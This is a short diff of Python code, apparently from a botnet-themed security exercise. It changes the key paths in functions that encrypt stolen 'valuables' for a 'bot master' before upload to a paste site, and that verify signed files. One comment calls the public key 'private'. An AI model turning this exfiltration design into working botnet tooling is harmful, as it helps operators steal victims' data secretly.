@@ -17,9 +17,9 @@ def save_valuable(data):
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
     h = SHA.new(data)
-    key = RSA.importKey(open(os.path.join("pastebot.net", "master_rsa.pub")).read())
+    key = RSA.importKey(open("Keys/master.pub").read())
     cipher = PKCS1_v1_5.new(key)
-    ciphertext = cipher.encrypt(data+h.digest())
+    ciphertext = cipher.encrypt(data + h.digest())
     return ciphertext
 
 def upload_valuables_to_pastebot(fn):
@@ -39,7 +39,7 @@ def verify_file(f):
     signature = f[:256]
     message = f[256:]
     # Read in the private key
-    key = RSA.importKey(open(os.path.join("pastebot.net", "master_rsa.pub")).read())
+    key = RSA.importKey(open("Keys/master.pub").read())
     
     #verify the signature
     h = SHA.new()
